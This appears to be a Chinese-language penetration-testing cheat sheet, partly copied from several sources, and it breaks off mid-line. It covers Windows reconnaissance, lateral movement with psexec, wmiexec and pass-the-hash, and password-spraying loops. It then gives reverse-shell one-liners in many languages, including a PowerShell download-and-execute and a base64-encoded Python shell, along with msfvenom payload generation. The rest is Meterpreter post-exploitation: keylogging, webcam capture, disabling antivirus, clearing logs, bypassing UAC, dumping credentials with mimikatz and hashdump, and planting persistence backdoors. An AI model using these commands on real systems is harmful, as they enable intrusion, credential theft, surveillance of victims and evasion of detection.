MSDTC在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启： 123sc qc msdtcsc config msdtc start= auto windows信息收集常用命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990Systeminfo 计算机详细信息(补丁信息)Net start 所启动的服务Wmic service list brief 查询本机服务信息Tasklist 进程列表Wmic startup get command,caption 查看启动该程序信息Schtasks /query /fo LIST /v计划任务Netstat -ano 根据本机端口开放情况来判断有什么服务、其角色Query user || qwinsta 查看当前在线用户Net session 列出会话Net share 查看本机的共享列表Wmic share get name,path,status 查看共享列表Net user 本地用户Net user kkkk 查看本地用户信息Net localgroup 本地用户组Net localgroup /domain 域用户组Net localgroup adminnstrators 本地管理员组成员net localgroup adminstrators /domain 查看登陆过主机的管理员Wmic useraccount get /all 获取域内用户详细信息dsquery user 查看存在的用户Net user /domain 域用户信息Net user kkkk /domain 域用户kkkk信息Net user kent password /add /domain添加域用户Net group /domain 域用户组信息Net view /domain 查询域Net view /domain:test 查询域内计算机Net accounts /domain 查询域中密码策略Net group /domain 查看域内所有用户组Net group &quot;Domain Controllers&quot; /domain 查看域控制器组Net group &quot;Domain computers&quot; /domain 查看域内所有计算机列表Net group &quot;Domain admins&quot; /domain 查看域内管理员用户Net user /domain kent active:yes 启用域账户Net user /domain kent active:no 禁用域账户Nltest /DCLIST:test 查看域中域控制器名Wmic useraccount get /all 用户详细信息Net group “Domain Admins” /domain 对应组下的账户信息nltest /domain_trusts 获取域信任信息net config workstation 了解本机的配置信息Netsh firewall show config 查看防火墙配置Netsh advfirewall set allprofiles state off关闭防火墙(windows server 2003后)Netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot; 允许指定程序进入(windows server 2003后)Netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;C:\\nc.exe&quot;允许指定程序退出(windows server 2003后)Netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow 允许3389连接(windows server 2003后)Reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot;查看端口代理配置信息Reg query &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /V PortNumber 查看远程桌面端口号 at&amp;schtasks&amp;sc横向使用明文密码登录到目标，需要445和139端口开启： 1234567891011121314151617net use \\\\192.168.2.148\\ipc$ password /user:test\\administratornet use \\\\192.168.2.148\\ipc$ password /user:administrator复制文件copy c:\\1.exe \\\\192.168.2.148\\c$at新建10:10分运行的定时作业at \\\\192.168.2.148 10:10 c:\\1.exeWindows server 2012及以上使用schtasks命令Schtasks /create /s 192.168.2.148 /ru “SYSTEM” /tn executefile /sc DAILY /tr c:/1.exe /FSchtasks /run /s 192.168.2.148 /tn executefile /iSchtasks /delete /s 192.168.2.148 /tn executefile /fsc \\\\192.168.210.107 create hacker binpath=&quot;c:\\shell1.exe&quot; #创建服务sc \\\\192.168.210.107 start hacker #启动hacker服务 impacket包横向命令下载https://github.com/maaaaz/impacket-examples-windowshttps://github.com/ropnop/impacket_static_binaries/releasesAtexec 1234需要445端口开启Atexec.exe hacker/administrator:abc123@192.168.202.148 &quot;whoami&quot;Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 &quot;whoami&quot; dcomexec 1234需要135端口开启dcomexec.exe hacker/administrator:abc123@192.168.202.148 &quot;whoami&quot;dcomexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 &quot;whoami&quot; psexec 12345678官方Psexec第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：Net use \\192.168.202.148\\ipc$ zxcvbnm123 /user:test\\AdministratorPsexec \\192.168.202.148 -accepteula -s cmd官方Psexec第二种利用方法：不用建立ipc连接，直接使用密码或hash进行传递Psexec \\192.168.202.148 -u Administrator -p zxcvbnm123 -s cmdPsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 &quot;whoami&quot; (官方提供的exe执行不了) smbexec 123需要445端口开启Smbexec test/Administrator:zxcvbnm123@192.168.202.148Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 wmi 1234567891011WMI利用135端口，支持明文和hash两种方式进行身份验证，且系统日志不记录。第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process call create &quot;cmd.exe /c ipconfig &gt;C:/1.txt&quot;第二种：使用系统自带cscript明文传递执行反弹shell，执行结果有回显，现已被杀Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123第三种：使用第三方impacket套件中的Wmiexec进行明文或hash传递，执行结果有回显Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 &quot;whoami&quot;Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 &quot;whoami&quot; 批量操作,需要保存为bat执行 12345678用已知密码和用户，批量连接ip:FOR /F %%i in (ips.txt) do net use \\%%i\\ipc$ “password” /user:hacker\\administrator已知用户和ip，批量连接密码(爆破密码)：FOR /F %%i in (pass.txt) do net use \\192.168.202.148\\ipc$ &quot;%%i&quot; /user:test\\administrator已知用户和ip，批量连接hash(爆破hash)：FOR /F %%i in (hash.txt) do atexec.exe -hashes :&quot;%%i&quot; test/administrator@192.168.202.148 &quot;whoami&quot; cme 批量 1proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d xx.org -x &quot;net user&quot; 单独执行命令 1crackmapexec smb 192.168.10.11 -u Administrator -p &#x27;P@ssw0rd&#x27; -x whoami ldap喷洒 1cme ldap 10.11.12.211 -u &#x27;username&#x27; -p &#x27;password&#x27; --kdcHost 10.11.12.211 --users 反弹shellnc1nc -lvvp 4444 bash12bash -i &gt;&amp; /dev/tcp/172.16.1.130/4444 0&gt;&amp;1exec 5&lt;&gt;/dev/tcp/172.16.1.130/4444;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done perl1perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; python1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.41&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; php1php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; ruby1ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27; nc123nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999 java123r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor() lua1lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot; powershell1powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444 加密shell12mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.0.100:2333 &gt; /tmp/s; rm /tmp/s msf大全到处抄的 https://xz.aliyun.com/t/2536 https://www.freebuf.com/articles/web/270456.html https://saucer-man.com/information_security/79.html https://www.anquanke.com/post/id/235631 https://www.anquanke.com/post/id/164525 安装安装 1234# 安装curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall安装目录 # /opt/metasploit-framework/embedded/framework/ payload生成 Linux 1234反向连接：msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf正向连接：msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf Windows 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe Mac 1msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho PHP 12msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php ASP 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp JSP 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp WAR 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war 执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行： 1php shell.php 3.脚本shell Python 1msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py Bash 1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh Perl 1msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl 执行方式：复制shell.py中的内容在linux命令行下执行： 1python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot; 4.shellcodeLinux Based Shellcode 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; Windows Based Shellcode 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; Mac Based Shellcode 1msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; Meterpreter基本命令首先需要先获取meterpreter： 12345678910use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 192.168.81.160set ExitOnSession falseexploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)jobs # 查看后台攻击任务 kill &lt;id&gt; # 停止某后台攻击任务 sessions -l # (查看会话)sessions -i 2 # 选择会话sessions -k 2 # 结束会话 如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用sessions-u 2来将cmdshell升级成meterpreter。 获取到了meterpreter，就可以进行后渗透了。 基本系统命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# 会话管理background #将当前会话放置后台sessions # 查看会话sessions -i # 切换会话quit # 关闭当前的会话，返回msf终端# 系统设置sysinfo # 查看目标机系统信息idletime # 查看目标机闲置时间reboot/shutdown # 重启/关机# shellshell # 获得控制台权限irb # 进入ruby终端# 进程迁移getpid # 获取当前进程的pidps # 查看当前活跃进程migrate &lt;pid值&gt; #将Meterpreter会话移植到指定pid值进程中kill &lt;pid值&gt; #杀死进程migrate &lt;pid值&gt; #将Meterpreter会话移植到指定pid值进程中# 执行文件execute #在目标机中执行文件execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互# 摄像头命令webcam_list #查看摄像头列表webcam_chat # 查看摄像头接口webcam_snap #通过摄像头拍照webcam_stream #通过摄像头开启视频# uictl开关键盘/鼠标uictl [enable/disable] [keyboard/mouse/all] #开启或禁止键盘/鼠标uictl disable mouse #禁用鼠标uictl disable keyboard #禁用键盘# 远程桌面/截屏enumdesktops #查看可用的桌面getdesktop #获取当前meterpreter 关联的桌面screenshot #截屏use espia #或者使用espia模块截屏 然后输入screengrabrun vnc #使用vnc远程桌面连接# 键盘记录keyscan_start #开始键盘记录keyscan_dump #导出记录数据keyscan_stop #结束键盘记录# 添加用户，开启远程桌面# 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令run post/windows/manage/enable_rdp #开启远程桌面run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户run post/windows/manage/enable_rdp FORWARD=true LPORT=6662 #将3389端口转发到6662# 关闭防病毒软件run killavrun post/windows/manage/killav# 修改注册表reg –h # 注册表命令帮助upload /usr/share/windows-binaries/nc.exe C:\\\\windows\\\\system32 #上传ncreg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run #枚举run下的keyreg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v lltest_nc -d &#x27;C:\\windows\\system32\\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值reg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\Run -v lltest_nc #查看键值nc -v 192.168.81.162 443 #攻击者连接nc后门# 清理日志clearav #清除windows中的应用程序日志、系统日志、安全日志 文件系统命令123456789101112131415cat/ls/cd/rm # 基本命令search -f *pass* -d C:\\\\windows # 搜索文件 -h查看帮助getwd/pwd # 获取当前目录getlwd/lpwd # 操作攻击者主机 查看当前目录upload /tmp/hack.txt C:\\\\lltest # 上传文件download c:\\\\lltest\\\\lltestpasswd.txt /tmp/ # 下载文件edit c:\\\\1.txt # 编辑或创建文件 没有的话，会新建文件mkdir lltest2 # 只能在当前目录下创建文件夹rmdir lltest2 # 只能删除当前目录下文件夹lcd /tmp # 操作攻击者主机 切换目录# timestomp伪造文件时间戳timestomp C:// -h #查看帮助timestomp -v C://2.txt #查看时间戳timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt 网络命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 基本ipconfig/ifconfignetstat –anoarpgetproxy #查看代理信息route #查看路由# portfwd端口转发portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码# 添加路由# 方式一autoroute （deprecated）run autoroute –h #查看帮助run autoroute -s 192.168.2.0/24 #添加到目标环境网络run autoroute –p #查看添加的路由# 方式二post/multi/manage/autorouterun post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络run post/multi/manage/autoroute CMD=print # 查看添加的路由(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))# 然后可以利用arp_scanner、portscan等进行存活检测run arp_scanner -r 192.168.2.0/24run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0# autoroute添加完路由后，还可以利用msf自带的模块进行socks代理# msf提供了2个模块用来做socks代理。# auxiliary/server/socks_proxy# use auxiliary/server/socks_unc# 先background退出来，然后：use auxiliary/server/socks_proxyset srvhost 127.0.0.1set srvport 1080run# 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080# 最后proxychains 使用Socks5代理访问# sniffer抓包use sniffersniffer_interfaces #查看网卡sniffer_start 2 #选择网卡 开始抓包sniffer_stats 2 #查看状态sniffer_dump 2 /tmp/lltest.pcap #导出pcap数据包sniffer_stop 2 #停止抓包 信息收集1234567891011121314# 信息收集的脚本位于：# modules/post/windows/gather# modules/post/linux/gather# 以下列举一些常用的run post/windows/gather/checkvm #是否虚拟机run post/linux/gather/checkvm #是否虚拟机run post/windows/gather/forensics/enum_drives #查看分区run post/windows/gather/enum_applications #获取安装软件信息run post/windows/gather/dumplinks #获取最近的文件操作run post/windows/gather/enum_ie #获取IE缓存run post/windows/gather/enum_chrome #获取Chrome缓存run post/windows/gather/enum_patches #补丁信息run post/windows/gather/enum_domain #查找定位域控run post/windows/gather/enum_logged_on_users #登录过的用户 提权1.getsystem提权getsystem工作原理：①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。③Windows服务已启动，导致与命名管道建立连接。④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。 1getsystem 2.bypassuac用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。 msf提供了如下几个模块帮助绕过UAC： 123456789101112131415msf5 auxiliary(server/socks5) &gt; search bypassuacMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/local/bypassuac 2010-12-31 excellent No Windows Escalate UAC Protection Bypass 1 exploit/windows/local/bypassuac_comhijack 1900-01-01 excellent Yes Windows Escalate UAC Protection Bypass (Via COM Handler Hijack) 2 exploit/windows/local/bypassuac_eventvwr 2016-08-15 excellent Yes Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key) 3 exploit/windows/local/bypassuac_fodhelper 2017-05-12 excellent Yes Windows UAC Protection Bypass (Via FodHelper Registry Key) 4 exploit/windows/local/bypassuac_injection 2010-12-31 excellent No Windows Escalate UAC Protection Bypass (In Memory Injection) 5 exploit/windows/local/bypassuac_injection_winsxs 2017-04-06 excellent No Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS 6 exploit/windows/local/bypassuac_sluihijack 2018-01-15 excellent Yes Windows UAC Protection Bypass (Via Slui File Handler Hijack) 7 exploit/windows/local/bypassuac_vbs 2015-08-22 excellent No Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability) 使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限 1234567891011121314151617181920212223242526# 示例meterpreter &gt; getuidServer username: SAUCERMAN\\TideSecmeterpreter &gt; background[*] Backgrounding session 4...msf5 exploit(multi/handler) &gt; use exploit/windows/local/bypassuacmsf5 exploit(windows/local/bypassuac) &gt; set SESSION 4SESSION =&gt; 4msf5 exploit(windows/local/bypassuac) &gt; run[-] Handler failed to bind to 192.168.81.160:4444:- -[-] Handler failed to bind to 0.0.0.0:4444:- -[*] UAC is Enabled, checking level...[+] UAC is set to Default[+] BypassUAC can bypass this setting, continuing...[+] Part of Administrators group! Continuing...[*] Uploaded the agent to the filesystem....[*] Uploading the bypass UAC executable to the filesystem...[*] Meterpreter stager executable 73802 bytes long being uploaded..[*] Sending stage (206403 bytes) to 192.168.81.154[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700[-] Exploit failed [timeout-expired]: Timeout::Error execution expired[*] Exploit completed, but no session was created.# 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功# 然鹅这里失败了 3.内核漏洞提权 无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。 123456789101112131415161718192021222324252627282930313233343536373839meterpreter &gt; run post/windows/gather/enum_patches #查看补丁信息msf5 &gt; use exploit/windows/local/ms13_053_schlampereimsf5 &gt; set SESSION 2msf5 &gt; exploit# 示例meterpreter &gt; run post/windows/gather/enum_patches[+] KB2871997 is missing[+] KB2928120 is missing[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1meterpreter &gt; background[*] Backgrounding session 4...msf5 exploit(windows/local/bypassuac) &gt; search MS13-081Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/local/ms13_081_track_popup_menu 2013-10-08 average Yes Windows TrackPopupMenuEx Win32k NULL Pagemsf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menumsf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4session =&gt; 4msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit[!] SESSION may not be compatible with this module.[-] Handler failed to bind to 192.168.81.160:4444:- -[-] Handler failed to bind to 0.0.0.0:4444:- -[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported[*] Exploit completed, but no session was created.# 然鹅失败了，摸摸头 获取凭证在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。 1.使用mimikatz 1234567891011121314151617181920212223242526272829303132333435363738load mimikatz #help mimikatz 查看帮助wdigest #获取Wdigest密码mimikatz_command -f samdump::hashes #执行mimikatz原始命令mimikatz_command -f sekurlsa::searchPasswords# 示例meterpreter &gt; load mimikatzLoading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?Success.meterpreter &gt; wdigest[!] Not currently running as SYSTEM[*] Attempting to getprivs ...[+] Got SeDebugPrivilege.[*] Retrieving wdigest credentialswdigest credentials===================AuthID Package Domain User Password------ ------- ------ ---- --------0;997 Negotiate NT AUTHORITY LOCAL SERVICE 0;996 Negotiate WORKGROUP SAUCERMAN$ 0;48748 NTLM 0;999 NTLM WORKGROUP SAUCERMAN$ 0;476238 NTLM SAUCERMAN TideSec 1234560;476209 NTLM SAUCERMAN TideSec 123456meterpreter &gt; mimikatz_command -f samdump::hashesOrdinateur : saucermanBootKey : 691cff33caf49e933be97fcee370256aRegOpenKeyEx SAM : (0x00000005) �ݿ�\u0002 Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125; 使用meterpreter的run hashdump命令 12345678910111213141516171819202122meterpreter &gt; run hashdump[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...][*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a.../opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Obtaining the user list and keys...[*] Decrypting user keys.../opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Dumping password hints...TideSec:&quot;123456&quot;[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4::: 3.post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump 从上面也可以看出官方推荐post/windows/gather/smart_hashdump 1234567891011121314151617meterpreter &gt; run post/windows/gather/smart_hashdump[*] Running module against SAUCERMAN[*] Hashes will be saved to the database if one is connected.[+] Hashes will be saved in loot in JtR password file format to:[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt[*] Dumping password hashes...[*] Running as SYSTEM extracting hashes from registry[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...[+] TideSec:&quot;123456&quot;[*] Dumping password hashes...[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4::: 4.powerdump同 hashdump，但失败了 12345678meterpreter &gt; run powerdump[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...[*] Running PowerDump to extract Username and Password Hashes...[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...[*] Setting ExecutionPolicy to Unrestricted...[*] Dumping the SAM database through PowerShell...[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified. 假冒令牌在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。 msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。 123456789101112# 1.incognito假冒令牌use incognito #help incognito 查看帮助list_tokens -u #查看可用的tokenimpersonate_token &#x27;NT AUTHORITY\\SYSTEM&#x27; #假冒SYSTEM token或者impersonate_token NT\\ AUTHORITY\\\\SYSTEM #不加单引号 需使用\\\\execute -f cmd.exe -i –t # -t 使用假冒的token 执行或者直接shellrev2self #返回原始token# 2.steal_token窃取令牌steal_token &lt;pid值&gt; #从指定进程中窃取token 先ps,找域控进程drop_token #删除窃取的token 植入后门Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。 1.persistence启动项后门 路径：metasploit&#x2F;scripts&#x2F;meterpreter&#x2F;persistence 原理是在C:\\Users***\\AppData\\Local\\Temp\\目录下，上传一个vbs脚本，在注册表HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\加入开机启动项，很容易被杀软拦截，官方不推荐 1234567891011121314151617run persistence –h #查看帮助run persistence -X -i 5 -p 4444 -r 192.168.81.160#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip# 示例meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Running Persistence Script[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc[*] Creating 